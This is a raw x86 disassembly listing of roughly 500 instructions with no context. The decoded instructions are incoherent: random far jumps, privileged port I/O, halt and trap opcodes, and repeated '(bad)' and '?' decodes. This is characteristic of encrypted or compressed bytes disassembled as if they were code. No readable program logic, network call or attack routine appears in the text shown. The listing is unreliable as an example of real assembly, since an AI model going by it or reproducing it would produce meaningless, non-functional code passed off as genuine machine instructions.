  41734a:	scas   eax,DWORD PTR es:[edi]
  41734b:	mov    BYTE PTR [esi+0x5c0a38d2],ch
  417351:	mov    DWORD PTR [esi],0x23584008
  417357:	int3   
  417358:	addr16 xchg ebx,eax
  41735a:	cmp    DWORD PTR [ecx-0x2f],edi
  41735d:	sub    DWORD PTR [eax+0x4dc0e28d],0x41
  417364:	dec    edx
  417365:	shl    BYTE PTR [edi+edi*4-0x58],0x5f
  41736a:	stos   DWORD PTR es:[edi],eax
  41736b:	sub    ah,dl
  41736d:	test   al,0xeb
  41736f:	xor    al,al
  417371:	fist   WORD PTR [ebx]
  417373:	xor    DWORD PTR [edi-0x7d],ebp
  417376:	sub    DWORD PTR [esi+0x71916ea8],ebp
  41737c:	dec    edx
  41737d:	adc    ch,BYTE PTR [ebx+0x33]
  417380:	and    al,BYTE PTR [ebx+edx*8-0x20]
  417384:	pop    edi
  417385:	xor    DWORD PTR [ecx],ebp
  417387:	repnz les edx,FWORD PTR [ebx]
  41738a:	into   
  41738b:	call   0xb8a9261e
  417390:	call   0x7f72:0x20d8d96c
  417397:	pop    ecx
  417398:	stc    
  417399:	inc    ebx
  41739a:	sbb    eax,0xb8d5f1ef
  41739f:	outs   dx,BYTE PTR ds:[esi]
  4173a0:	sub    bh,BYTE PTR [ebx]
  4173a2:	mov    esi,0x13ecc443
  4173a7:	or     eax,0xdbfb9a8a
  4173ac:	xchg   ecx,eax
  4173ad:	in     al,0x2a
  4173af:	loope  0x417360
  4173b1:	and    cl,BYTE PTR [ebx]
  4173b3:	cmp    esi,DWORD PTR [edx+0x1094402a]
  4173b9:	sbb    al,0x95
  4173bb:	xchg   edi,eax
  4173bc:	adc    BYTE PTR [eax],al
  4173be:	push   es
  4173bf:	neg    edi
  4173c1:	push   edx
  4173c2:	pop    ebx
  4173c3:	sti    
  4173c4:	jecxz  0x4173b1
  4173c6:	fsubr  DWORD PTR [ecx-0x634844a9]
  4173cc:	sar    BYTE PTR [ecx-0x33],cl
  4173cf:	sub    ebx,esi
  4173d1:	icebp  
  4173d2:	mov    ds:0x88630d79,eax
  4173d7:	fld    TBYTE PTR [ebx+eax*4]
  4173da:	mov    cl,0x78
  4173dc:	ret    0xa569
  4173df:	fwait
  4173e0:	mov    gs,WORD PTR [eax-0x8]
  4173e3:	xor    eax,0xbabcb798
  4173e8:	jae    0x417372
  4173ea:	xor    BYTE PTR [edx-0x10],bh
  4173ed:	jbe    0x417434
  4173ef:	jle    0x417371
  4173f1:	push   esi
  4173f2:	adc    ebx,DWORD PTR [esi+ebx*8-0x3c]
  4173f6:	pop    ss
  4173f7:	aas    
  4173f8:	ror    bh,1
  4173fa:	sar    BYTE PTR [eax+eax*4-0x6c51e734],1
  417401:	bound  ebx,QWORD PTR [eax+0x5d]
  417404:	jmp    0xed92:0x59564e10
  41740b:	shr    BYTE PTR [esi],0x62
  41740e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41740f:	lods   al,BYTE PTR ds:[esi]
  417410:	lea    ebp,[esi-0x7d]
  417413:	sahf   
  417414:	imul   ecx,DWORD PTR [eax],0x2b3053b6
  41741a:	dec    ebp
  41741b:	xor    eax,0x7c445df9
  417420:	or     al,0xad
  417422:	test   BYTE PTR [edi+0x3bea9785],dl
  417428:	daa    
  417429:	out    0x80,al
  41742b:	mov    ah,0x3
  41742d:	mov    DWORD PTR [esi+0x778e08b],ecx
  417433:	and    ebx,eax
  417435:	mov    dl,0x7
  417437:	hlt    
  417438:	in     al,dx
  417439:	sbb    al,0x98
  41743b:	shl    BYTE PTR [esi],cl
  41743d:	add    al,0x82
  41743f:	ror    bh,1
  417441:	dec    edx
  417442:	cli    
  417443:	pusha  
  417444:	pop    ecx
  417445:	cmp    al,0xb5
  417447:	mov    BYTE PTR ds:0x13ab4b95,dl
  41744d:	sub    DWORD PTR [edx-0x2f],0x1919e90f
  417454:	inc    edi
  417455:	sub    al,0x6
  417457:	sbb    ecx,DWORD PTR [edx]
  417459:	div    BYTE PTR ds:0xcb41da7a
  41745f:	mov    esi,0x20004f6d
  417464:	call   0x9cce955a
  417469:	mov    eax,0x7361dd65
  41746e:	jecxz  0x417444
  417470:	pcmpeqd mm2,QWORD PTR [eax+0x66156a9]
  417477:	xor    al,0xf2
  417479:	arpl   WORD PTR [esp+esi*4],bx
  41747c:	pop    ecx
  41747d:	pop    edx
  41747e:	xchg   ebx,eax
  41747f:	mov    eax,0x161fc189
  417484:	dec    esp
  417485:	out    dx,eax
  417486:	jge    0x41745c
  417488:	aaa    
  417489:	stc    
  41748a:	jns    0x4174ca
  41748c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41748d:	push   ss
  41748e:	call   0x5d32e8a4
  417493:	jmp    0x417438
  417495:	dec    esi
  417496:	cwde   
  417497:	fwait
  417498:	pop    ss
  417499:	das    
  41749a:	in     al,0x7b
  41749c:	or     edi,ebx
  41749e:	lock pop ecx
  4174a0:	jns    0x417470
  4174a2:	test   DWORD PTR [ebp-0x2c],esi
  4174a5:	mov    ebp,0xa7a68b86
  4174aa:	inc    ebp
  4174ab:	mov    bl,0x44
  4174ad:	xchg   ecx,eax
  4174ae:	cmp    eax,0xdcbe9698
  4174b3:	sbb    al,0x26
  4174b5:	fidiv  DWORD PTR fs:[edi]
  4174b8:	js     0x417497
  4174ba:	lods   eax,DWORD PTR ds:[esi]
  4174bb:	cmp    edx,DWORD PTR [ecx+0x65c467d4]
  4174c1:	add    edx,ecx
  4174c3:	cmp    ebp,edx
  4174c5:	out    0xe,eax
  4174c7:	(bad)  
  4174c9:	(bad)  
  4174ca:	in     al,0xef
  4174cc:	cs popf 
  4174ce:	sub    al,0xf1
  4174d0:	retf   
  4174d1:	scas   al,BYTE PTR es:[edi]
  4174d2:	push   0x35
  4174d4:	mov    esi,0xed32eecc
  4174d9:	xor    dh,BYTE PTR [eax-0x56]
  4174dc:	icebp  
  4174dd:	mov    bl,0x29
  4174df:	test   DWORD PTR [ecx+0x397e783d],0xef65d594
  4174e9:	mov    bl,0xb1
  4174eb:	push   eax
  4174ec:	sahf   
  4174ed:	imul   edx,DWORD PTR [edx+0x3c],0xfe236004
  4174f4:	mov    ds:0x8158bb17,eax
  4174f9:	inc    esi
  4174fa:	in     eax,0x17
  4174fc:	lock sbb DWORD PTR [ebx+0x73bb5b91],eax
  417503:	jmp    0x511c:0xfa180a9d
  41750a:	jns    0x417567
  41750c:	mov    cl,0x13
  41750e:	sub    al,0x68
  417510:	shr    esp,cl
  417512:	inc    esi
  417513:	fld    DWORD PTR [ecx]
  417515:	cli    
  417516:	add    esp,esi
  417518:	data16 cld 
  41751a:	int3   
  41751b:	mov    ?,WORD PTR [edx-0x8f705fb]
  417521:	lds    esp,FWORD PTR [esi]
  417523:	push   ecx
  417524:	inc    edx
  417525:	push   ecx
  417526:	mov    edi,0xaa7218cf
  41752c:	cs std 
  41752e:	inc    esi
  41752f:	inc    eax
  417530:	sbb    eax,DWORD PTR [esi+0x3416d5b0]
  417536:	aaa    
  417537:	gs into 
  417539:	outs   dx,DWORD PTR ds:[esi]
  41753a:	xchg   ecx,eax
  41753b:	icebp  
  41753c:	cmp    dh,BYTE PTR [ebx-0x28ef2ed0]
  417542:	pushf  
  417543:	mov    fs,WORD PTR [ecx+0x67108b53]
  417549:	inc    esp
  41754a:	inc    edi
  41754b:	xor    cl,BYTE PTR [esi+0x7defc270]
  417551:	push   0xc0e9912c
  417556:	mov    bl,0xde
  417558:	shl    BYTE PTR [esi-0x7f9402],1
  41755e:	lds    esi,FWORD PTR ds:[eax]
  417561:	gs jge 0x4174f0
  417564:	fnstcw WORD PTR [eax+0x5559d10f]
  41756a:	pop    ebx
  41756b:	pop    es
  41756c:	addr16 fwait
  41756e:	and    al,0x37
  417570:	inc    edi
  417571:	ins    DWORD PTR es:[edi],dx
  417572:	test   eax,0x733fa14c
  417577:	sbb    al,0x55
  417579:	pop    es
  41757a:	sub    eax,0x1eb65fa4
  41757f:	loopne 0x417590
  417581:	(bad)
  417584:	loopne 0x417534
  417586:	add    edx,DWORD PTR [esi+0x71]
  417589:	loopne 0x417595
  41758b:	or     eax,0x47b11003
  417590:	and    BYTE PTR [edi+0x61],cl
  417593:	sbb    BYTE PTR [esi+0x24ed8471],ch
  417599:	xchg   edx,eax
  41759a:	rcl    BYTE PTR [edx*8-0x69caa0f],cl
  4175a1:	push   edi
  4175a2:	leave  
  4175a3:	shl    BYTE PTR [edi+0xee297e],1
  4175a9:	(bad)  
  4175aa:	ds xor eax,0x9e7fdfd2
  4175b0:	sub    esp,DWORD PTR [esi-0x9]
  4175b3:	ins    BYTE PTR es:[edi],dx
  4175b4:	mov    BYTE PTR [edx+esi*4+0x5b6abb59],al
  4175bb:	cs cdq 
  4175bd:	or     edi,DWORD PTR [eax]
  4175bf:	xor    BYTE PTR [esi],ch
  4175c1:	pop    ecx
  4175c2:	sub    BYTE PTR [edi-0x54],ah
  4175c5:	or     eax,0x444a8a4
  4175ca:	scas   eax,DWORD PTR es:[edi]
  4175cb:	in     eax,dx
  4175cc:	mov    ebx,0xd32be677
  4175d1:	or     BYTE PTR [ecx],bh
  4175d3:	aad    0x67
  4175d5:	xor    eax,0x34291eed
  4175da:	movq   mm5,QWORD PTR [esi+0x7600ea5b]
  4175e1:	and    bl,BYTE PTR [eax-0x78f0f405]
  4175e7:	in     eax,dx
  4175e8:	(bad)  
  4175e9:	ds ja  0x417639
  4175ec:	lahf   
  4175ed:	out    0x43,eax
  4175ef:	pop    edx
  4175f0:	rol    DWORD PTR [ebx+0x9031ec4],0xf3
  4175f7:	push   eax
  4175f8:	bnd jl 0x417658
  4175fb:	fild   QWORD PTR [ebp-0x6e4562d0]
  417601:	push   es
  417602:	push   esp
  417603:	mov    esi,0x2a8dad2b
  417608:	sbb    eax,0x99b15517
  41760d:	pop    esi
  41760e:	test   BYTE PTR [edi],ah
  417610:	ja     0x417592
  417612:	leave  
  417613:	pop    ds
  417614:	aad    0x2b
  417616:	mov    ds:0xfc3cd53,al
  41761b:	inc    eax
  41761c:	clc    
  41761d:	add    bh,BYTE PTR [edi]
  41761f:	jecxz  0x4175a5
  417621:	sub    esp,edi
  417623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417624:	add    al,BYTE PTR [eax-0x2f]
  417627:	mov    edx,0x468f524
  41762c:	sbb    DWORD PTR ds:0x78fe2144,0xfffffff2
  417633:	cli    
  417634:	xchg   esp,eax
  417635:	push   ebp
  417636:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417637:	xchg   esp,eax
  417638:	or     eax,0xa53d2649
  41763d:	or     eax,0xb2bdf164
  417642:	fdiv   st,st(0)
  417644:	imul   edi,eax,0xfffffff6
  417647:	or     al,0x70
  417649:	imul   ebp,DWORD PTR [edx],0x11
  41764c:	aas    
  41764d:	cmc    
  41764e:	jae    0x417688
  417650:	jge    0x417651
  417652:	mov    bl,0x3f
  417654:	(bad)  
  417655:	hlt    
  417656:	push   cs
  417657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417658:	or     bh,BYTE PTR [ecx+0xe]
  41765b:	ins    BYTE PTR es:[edi],dx
  41765c:	jp     0x417696
  41765e:	xor    BYTE PTR [edx+0x2f],ah
  417661:	xor    eax,0x63c4f717
  417666:	cmp    DWORD PTR [ecx-0x6],esp
  417669:	mov    ds:0x433c65d7,al
  41766e:	fs cli 
  417670:	bnd ja 0x4176e9
  417673:	xor    al,0xc2
  417675:	nop
  417676:	out    dx,eax
  417677:	inc    esi
  417678:	dec    ebx
  417679:	or     bl,BYTE PTR [ecx+0x695c56ef]
  41767f:	stos   BYTE PTR es:[edi],al
  417680:	lea    ecx,[edi+0x33c0440d]
  417686:	mov    bh,0x3a
  417688:	loop   0x41768d
  41768a:	ss pop ecx
  41768c:	and    DWORD PTR ss:[edx-0x66],ebp
  417690:	test   eax,0x8073adff
  417695:	or     BYTE PTR [ecx-0x48],ah
  417698:	(bad)  
  417699:	push   0xaacef238
  41769e:	into   
  41769f:	sub    al,BYTE PTR [eax-0x6c]
  4176a2:	in     eax,0xf5
  4176a4:	push   eax
  4176a5:	aaa    
  4176a6:	cwde   
  4176a7:	inc    ecx
  4176a8:	mov    ebx,0x212dcd77
  4176ad:	mov    WORD PTR [ecx-0x7],?
  4176b0:	out    0x67,al
  4176b2:	js     0x417637
  4176b4:	hlt    
  4176b5:	icebp  
  4176b6:	clc    
  4176b7:	inc    edx
  4176b8:	cmp    al,0x20
  4176ba:	mov    ah,0xbf
  4176bc:	out    0x3c,eax
  4176be:	mov    WORD PTR ds:0xec11367b,es
  4176c4:	sbb    DWORD PTR [ecx-0x6f],ebx
  4176c7:	push   DWORD PTR [ebx+0x168f2e4f]
  4176cd:	xor    esi,DWORD PTR [eax]
  4176cf:	gs push 0xdcb8f076
  4176d5:	add    eax,0x38ad46f0
  4176da:	mov    al,0x83
  4176dc:	lods   eax,DWORD PTR ds:[esi]
  4176dd:	ret    0x9643
  4176e0:	jb     0x4176bc
  4176e2:	xor    edx,DWORD PTR [eax+0x3c]
  4176e5:	adc    dl,bh
  4176e7:	imul   ebx,DWORD PTR [ebx+0x2e55294e],0x5492b98b
  4176f1:	and    al,0x9a
  4176f3:	fmul   st(1),st
  4176f6:	pusha  
  4176f7:	dec    esi
  4176f8:	cmp    al,BYTE PTR [esi+0x3f]
  4176fb:	scas   al,BYTE PTR es:[edi]
  4176fc:	dec    esi
  4176fd:	or     eax,0x6dd08873
  417702:	retf   0xb9fd
  417705:	lea    esi,[ebx]
  417707:	pop    ecx
  417708:	or     eax,DWORD PTR [eax-0x38]
  41770b:	jno    0x417723
  41770d:	ja     0x417728
  41770f:	mov    al,0x3f
  417711:	mov    dl,0x19
  417713:	xlat   BYTE PTR ds:[ebx]
  417714:	xchg   ecx,eax
  417715:	xchg   edx,eax
  417716:	push   edi
  417717:	retf   
  417718:	ins    DWORD PTR es:[edi],dx
  417719:	push   0x4e
  41771b:	inc    ebp
  41771c:	push   esp
  41771d:	fcmovu st,st(1)
  41771f:	inc    edi
  417720:	(bad)  
  417721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417722:	out    0x22,al
  417724:	sbb    DWORD PTR [ecx+ebx*4],ebp
  417727:	rcl    DWORD PTR [eax+0x24],0xb7
  41772b:	mov    WORD PTR [ebx-0x4ed3dfc2],cs
  417731:	into   
  417732:	daa    
  417733:	sbb    ebp,DWORD PTR [ebx+0x30]
  417736:	jge    0x4176f1
  417738:	inc    ecx
  417739:	adc    al,0xc2
  41773b:	jae    0x41775f
  41773d:	dec    eax
  41773e:	xchg   edi,eax
  41773f:	daa    
  417740:	test   eax,0xe5401322
  417745:	sbb    BYTE PTR [edi-0x53],al
  417748:	pusha  
  417749:	call   0xab6e3311
  41774e:	add    al,BYTE PTR [eax+esi*1-0x620c1d95]
  417755:	test   DWORD PTR [ebx+0x1308f014],eax
  41775b:	inc    edx
  41775c:	dec    edi
  41775d:	mov    edx,0x7df4ca9d
  417762:	add    bl,BYTE PTR [ecx+0x1f]
  417765:	sub    esi,eax
  417767:	or     al,0x4e
  417769:	dec    ecx
  41776a:	ins    DWORD PTR es:[edi],dx
  41776b:	out    dx,eax
  41776c:	outs   dx,BYTE PTR ds:[esi]
  41776d:	leave  
  41776e:	repz (bad) 
  417770:	aam    0xd3
  417772:	ins    DWORD PTR es:[edi],dx
  417773:	aad    0x40
  417775:	sub    DWORD PTR [ecx],0x5c
  417778:	es ds cld 
  41777b:	in     al,dx
  41777c:	shl    DWORD PTR [eax-0x4a74dd97],0xf
  417783:	and    al,0x20
  417785:	inc    DWORD PTR [edx+0x2b]
  417788:	outs   dx,BYTE PTR ds:[esi]
  417789:	nop
  41778a:	jle    0x417734
  41778c:	jp     0x417741
  41778e:	cs adc al,0x47
  417791:	pop    esi
  417792:	mov    al,0xe9
  417794:	jl     0x4177be
  417796:	fmul   st(4),st
  417798:	jmp    0xcd99:0x5813e435
  41779f:	lahf   
  4177a0:	not    DWORD PTR [esi-0x2a1a5a66]
  4177a6:	jns    0x41774d
  4177a8:	xor    edx,eax
  4177aa:	mov    edx,0xb944ca56
  4177af:	xor    BYTE PTR [ebx],al
  4177b1:	in     eax,0x56
  4177b3:	xchg   edi,eax
  4177b4:	xchg   ecx,eax
  4177b5:	popa   
  4177b6:	popf   
  4177b7:	gs sahf 
  4177b9:	mov    WORD PTR [eax-0x2e008f8f],?
  4177bf:	mov    ah,0x39
  4177c1:	push   edx
  4177c2:	repnz and DWORD PTR [bp+di+0x6385],0xe2b6d558
  4177cc:	dec    ebx
  4177cd:	(bad)  
  4177ce:	mov    ebx,0x242417e9
  4177d3:	enter  0x7e45,0x58
  4177d7:	aad    0xc8
  4177d9:	cmp    BYTE PTR cs:[edi-0x7c],ch
  4177dd:	and    BYTE PTR [eax],dl
  4177df:	dec    edi
  4177e0:	stos   BYTE PTR es:[edi],al
  4177e1:	les    ebp,FWORD PTR [edx+0x9]
  4177e4:	icebp  
  4177e5:	add    eax,0xb7bada89
  4177ea:	xchg   edx,eax
  4177eb:	lea    esp,[ebx]
  4177ed:	loope  0x41783c
  4177ef:	out    dx,al
  4177f0:	mov    edx,0xc0ea9a1f
  4177f5:	push   edx
  4177f6:	mov    esi,0xcb8a243
  4177fb:	sub    al,0x95
  4177fd:	mov    cl,0x77
  4177ff:	aaa    
  417800:	cmp    eax,0xe8a3035d
  417805:	aad    0x4b
  417807:	sbb    DWORD PTR [ecx-0x380ea6fc],eax
  41780d:	aam    0xe3
  41780f:	jl     0x417801
  417811:	jmp    0x14eb2cd2
  417816:	mov    ch,0xd0
  417818:	fst    DWORD PTR [bp+si]
  41781b:	jl     0x4177cd
  41781d:	sub    BYTE PTR [eax-0x47],bl
  417820:	repz stc 
  417822:	shl    esp,0xbf
  417825:	and    DWORD PTR [ebx+0x6a84b11f],edi
  41782b:	jne    0x41780f
  41782d:	mov    al,ds:0x164a7744
  417832:	add    dh,BYTE PTR [eax]
  417834:	stos   DWORD PTR es:[edi],eax
  417835:	das    
  417836:	dec    eax
  417837:	add    eax,0xff2339be
  41783c:	fstp   DWORD PTR [edx]
  41783e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41783f:	pusha  
  417840:	or     si,WORD PTR [edi+0x10]
  417844:	jg     0x4177f5
  417846:	pop    esi
  417847:	adc    DWORD PTR ds:[ebx+0x6b],0x44
  41784c:	push   ebx
  41784d:	mov    bh,0xf6
  41784f:	imul   ecx,DWORD PTR [edi+0x2202680],0x4b
  417856:	xchg   edx,eax
  417857:	fst    DWORD PTR [ebp-0x1c1998c2]
  41785d:	mov    ch,0xfa
  41785f:	and    al,0x85
  417861:	cwde   
  417862:	mov    ecx,0x348db03d
  417867:	inc    ebx
  417868:	jo     0x4178ca
  41786a:	mov    al,ds:0x4120d1cc
  41786f:	fst    QWORD PTR [edx-0x7264c898]
  417875:	mov    dh,0x60
  417877:	or     DWORD PTR [edi-0xe7a1533],edi
  41787d:	fucom  st(2)
  41787f:	dec    bx
  417881:	jge    0x41788f
  417883:	popf   
  417884:	hlt    
  417885:	test   al,0xe1
  417887:	das    
  417888:	daa    
  417889:	sar    BYTE PTR [edx-0x64],1
  41788c:	sbb    al,BYTE PTR [eax-0x79ddf3c]
  417892:	div    ebx
  417894:	mov    edx,?
  417896:	jmp    0x9aa1:0x2062ab13
  41789d:	mov    bh,0xcb
  41789f:	dec    ebx
  4178a0:	mov    es,edi
  4178a2:	inc    esi
  4178a3:	in     al,0x65
  4178a5:	sbb    al,0x6a
  4178a7:	das    
  4178a8:	jo     0x4178de
  4178aa:	retf   
  4178ab:	push   0xe4c44aee
  4178b0:	add    edi,DWORD PTR [esi-0x247e90d4]
  4178b6:	push   0x8b91abfb
  4178bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178bc:	and    ecx,DWORD PTR [edx+0x5a541deb]
  4178c2:	lock pop ss
  4178c4:	sub    al,0x74
  4178c6:	test   eax,0x5d9a45a9
  4178cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178cc:	fcomp  DWORD PTR [edi]
  4178ce:	int3   
  4178cf:	cmp    DWORD PTR [esi-0x63],ebx
  4178d2:	rcl    DWORD PTR [edi],0x64
  4178d5:	and    al,0xc4
  4178d7:	clc    
  4178d8:	out    0x1,al
  4178da:	cs js  0x41794c
  4178dd:	pop    ebp
  4178de:	stos   BYTE PTR es:[edi],al
  4178df:	push   esi
  4178e0:	xchg   BYTE PTR [ebx-0x2dc8d809],cl
  4178e6:	clc    
  4178e7:	mov    dl,0xe7
  4178e9:	arpl   WORD PTR [ecx],di
  4178eb:	xchg   ebx,eax
  4178ec:	inc    ebp
  4178ed:	inc    esp
  4178ee:	mov    eax,0x11ccb168
  4178f3:	cli    
  4178f4:	pop    esp
  4178f5:	xchg   BYTE PTR [eax+0x64a1a393],bl
  4178fb:	sbb    ch,bh
  4178fd:	cmp    al,cl
  4178ff:	jl     0x417925
  417901:	div    DWORD PTR [ebx-0x400aeb7d]
  417907:	add    BYTE PTR [edx],cl
  417909:	arpl   WORD PTR [esi-0x2a7543a3],sp
  41790f:	retf   0x930
  417912:	mov    edx,0x536e19f6
  417917:	and    ch,bh
  417919:	xchg   DWORD PTR [edi+0x3c],edx
  41791c:	mov    al,ds:0xab772d2
  417921:	lods   al,BYTE PTR ds:[esi]
  417922:	xor    BYTE PTR [ebx],ah
  417924:	xlat   BYTE PTR ds:[ebx]
  417925:	xor    ebp,ecx
  417927:	and    DWORD PTR [ebx+eax*4],edi
  41792a:	push   edi
  41792b:	imul   ebp,DWORD PTR [edi+0x4f],0x13
  41792f:	inc    ecx
  417930:	or     BYTE PTR [eax+esi*2-0x254162a2],dl
  417937:	fwait
  417938:	xchg   edx,eax
  417939:	jb     0x41790c
  41793b:	push   cs
  41793c:	or     eax,0x11fab0ca
  417941:	ds push esi
  417943:	mov    ebp,DWORD PTR [edx]
  417945:	cmp    eax,0x8b4ac75f
  41794a:	(bad)  
  41794c:	(bad)  
  41794d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41794e:	stc    
  41794f:	or     BYTE PTR ds:0x315673fb,dl
  417955:	push   edx
  417956:	ror    edx,1
  417958:	imul   ecx,DWORD PTR [esi],0x17
  41795b:	sbb    al,0x9f
  41795d:	pop    esi
  41795e:	and    esp,ebp
  417960:	xchg   ecx,eax
  417961:	pusha  
  417962:	cmp    dh,dl
  417964:	sub    eax,0xc8c5f1e0
  417969:	fistp  WORD PTR [ecx]
  41796b:	sub    eax,0x40cc179b
  417970:	xchg   ebp,eax
  417971:	pop    eax
  417972:	inc    edx
  417973:	fild   WORD PTR [esi]
  417975:	test   DWORD PTR ss:[edi+0x10a4e84e],esp
  41797c:	mov    eax,ds:0x321512fd
  417981:	mov    edx,DWORD PTR [edx+0x4064fadb]
  417987:	pop    edx
  417988:	arpl   WORD PTR [ebx],ax
  41798a:	and    BYTE PTR [eax],0x2f
  41798d:	loop   0x417940
  41798f:	mov    ebx,0xe88bfca4
  417994:	inc    ebx
  417995:	mov    WORD PTR ds:0x3b790ac2,ss
  41799b:	pop    edx
  41799c:	xor    bl,BYTE PTR ds:0x97839d0b
  4179a2:	aam    0x32
  4179a4:	pop    ds
  4179a5:	mov    ah,BYTE PTR [ebx]
  4179a7:	stos   DWORD PTR es:[edi],eax
  4179a8:	mov    ds:0xe3afbdab,eax
  4179ad:	(bad)  
  4179ae:	and    edi,DWORD PTR [ecx-0x9]
  4179b1:	pop    esi
  4179b2:	dec    ecx
  4179b3:	ins    DWORD PTR es:[edi],dx
  4179b4:	or     al,0xc0
  4179b6:	pop    eax
  4179b7:	dec    eax
  4179b8:	dec    esp
  4179b9:	std    
  4179ba:	and    ah,BYTE PTR [ebp+0x36827281]
  4179c0:	nop
  4179c1:	or     al,0x42
  4179c3:	std    
  4179c4:	dec    ebp
  4179c5:	ins    BYTE PTR es:[edi],dx
  4179c6:	sub    ah,BYTE PTR [ebx+0x231e220d]
  4179cc:	es repnz aaa 
  4179cf:	mov    ss:0x78c29bca,eax
  4179d5:	pop    edx
  4179d6:	sbb    eax,0x1289a014
  4179db:	sub    ah,BYTE PTR [ecx-0x2b]
  4179de:	nop
  4179df:	sbb    DWORD PTR ds:0x5c37c476,ecx
  4179e5:	iret   
  4179e6:	jmp    0xf374:0x1351fa3d
  4179ed:	fnstsw WORD PTR [edi-0x54]
  4179f0:	stos   BYTE PTR es:[edi],al
  4179f1:	sbb    ch,BYTE PTR [ecx+0x57540620]
  4179f7:	pop    ecx
  4179f8:	xor    al,0x0
  4179fa:	push   esi
  4179fb:	jmp    0xcfad:0x1d004254
  417a02:	jg     0x4179e9
  417a04:	mov    gs,ebx
  417a06:	cmp    bl,BYTE PTR [edx-0x7dfaa6fe]
  417a0c:	jge    0x4179fc
  417a0e:	mov    ebp,0xae768f1a
  417a13:	dec    esi
  417a14:	jmp    0x783cca6e
  417a19:	and    bl,bh
  417a1b:	push   0x5752b3cc
  417a20:	in     eax,dx
  417a21:	xor    al,0x63
  417a23:	ja     0x4179f7
  417a25:	and    BYTE PTR [edx+eax*8+0x13cb78ed],al
  417a2c:	or     eax,0x61785f44
  417a31:	xor    al,0xa1
  417a33:	sub    BYTE PTR [eax-0x1f8787ec],ch
  417a39:	in     al,dx
  417a3a:	xor    BYTE PTR [edx-0x50],al
  417a3d:	into   
  417a3e:	into   
  417a3f:	push   es
  417a40:	mov    bl,0x7b
  417a42:	push   eax
  417a43:	xor    ecx,DWORD PTR es:[edi+ebx*2]
  417a47:	popf   
  417a48:	int3   
  417a49:	mov    ?,WORD PTR [ebp+0x744172ed]
  417a4f:	jns    0x4179f9
  417a51:	ins    DWORD PTR es:[edi],dx
  417a52:	jno    0x417ab9
  417a54:	stos   BYTE PTR es:[edi],al
  417a55:	xor    DWORD PTR [esi-0x3b],ebx
  417a58:	push   es
  417a59:	jb     0x417aa8
  417a5b:	push   cs
  417a5c:	(bad)  
  417a5d:	icebp  
  417a5e:	ror    BYTE PTR [eax+0x26b9303b],1
  417a64:	add    bl,dl
  417a66:	cmp    al,0xab
  417a68:	gs aam 0xc1
  417a6b:	mov    bl,0x1b
  417a6d:	shl    ebx,1
  417a6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a70:	inc    esi
  417a71:	je     0x417a8c
  417a73:	jecxz  0x417a26
  417a75:	mov    al,ds:0xd59c9cb
  417a7a:	popf   
  417a7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a7c:	jnp    0x417a9c
  417a7e:	push   esi
  417a7f:	add    eax,0xd7a8d728
  417a84:	dec    edi
  417a85:	lea    edi,[ebp-0x61]
  417a88:	push   ss
  417a89:	pop    ebx
  417a8a:	push   esp
  417a8b:	dec    ebp
  417a8c:	iret   
  417a8d:	xor    esi,ebx
  417a8f:	pusha  
  417a90:	mov    bl,0x6d
  417a92:	retf   0x8d40
  417a95:	mov    esp,ss
  417a97:	push   cs
  417a98:	gs jns 0x417a5a
  417a9b:	jecxz  0x417a41
  417a9d:	pminsw mm5,QWORD PTR [edx]
  417aa0:	inc    esi
  417aa1:	(bad)  
  417aa2:	aam    0x98
  417aa4:	pushf  
  417aa5:	int3   
  417aa6:	hlt    
  417aa7:	jg     0x417add
  417aa9:	mov    eax,ds:0xedafc332
  417aae:	xlat   BYTE PTR ds:[ebx]
  417aaf:	mov    ch,0x65
  417ab1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ab2:	fninit 
  417ab4:	pop    ebp
  417ab5:	mov    bh,0xf9
  417ab7:	idiv   DWORD PTR [ecx+0x23360f6e]
  417abd:	in     al,dx
  417abe:	xor    ah,BYTE PTR [esi]
  417ac0:	nop
  417ac1:	sub    DWORD PTR [eax+0x69],0x6cdd45b4
  417ac8:	addr16 into 
  417aca:	push   ds
  417acb:	fistp  DWORD PTR [ebx+0x17]
  417ace:	and    eax,0xa25d6e8a
  417ad3:	push   esi
  417ad4:	mov    bl,0x6d
  417ad6:	mov    ebx,0xfc7af981
  417adb:	pop    es
  417adc:	nop
  417add:	pop    esi
  417ade:	pop    edx
  417adf:	bnd ret 0x9412
  417ae3:	add    ecx,esi
  417ae5:	jo     0x417ad7
  417ae7:	arpl   sp,dx
  417ae9:	cmp    bl,dh
  417aeb:	js     0x417acb
  417aed:	lahf   
  417aee:	inc    esp
  417aef:	sbb    eax,0x348acbd9
  417af4:	dec    eax
  417af5:	and    DWORD PTR [ebp+edx*8+0x2a],ebx
  417af9:	cs mov edx,0x5c2cc037
  417aff:	mov    ds:0xd6fc312c,eax
  417b04:	jge    0x417ac2
  417b06:	xchg   BYTE PTR ds:0x35209e3d,bh
  417b0c:	rcl    DWORD PTR [esi],0x10
  417b0f:	mov    al,ds:0xc22f240f
  417b14:	sbb    eax,0x1b8156c7
  417b19:	jae    0x417b8a
  417b1b:	dec    edx
  417b1c:	nop
  417b1d:	test   BYTE PTR [ebp-0x6e],ah
  417b20:	or     bh,BYTE PTR [edi+0x1d]
  417b23:	dec    edx
  417b24:	inc    eax
  417b25:	cwde   
  417b26:	int    0x45
  417b28:	pop    edx
  417b29:	es mov edi,0xfcf4c692
  417b2f:	out    0x61,al
  417b31:	fiadd  WORD PTR [ebx-0xf]
  417b34:	in     eax,0x81
  417b36:	adc    esi,ebx
  417b38:	cdq    
  417b39:	xchg   ecx,eax
  417b3a:	adc    BYTE PTR [esi+0x37],bh
  417b3d:	adc    al,dl
  417b3f:	test   DWORD PTR [ebp+0x35],esi
  417b42:	fwait
  417b43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b44:	mov    WORD PTR [eax],?
  417b46:	repnz imul ecx
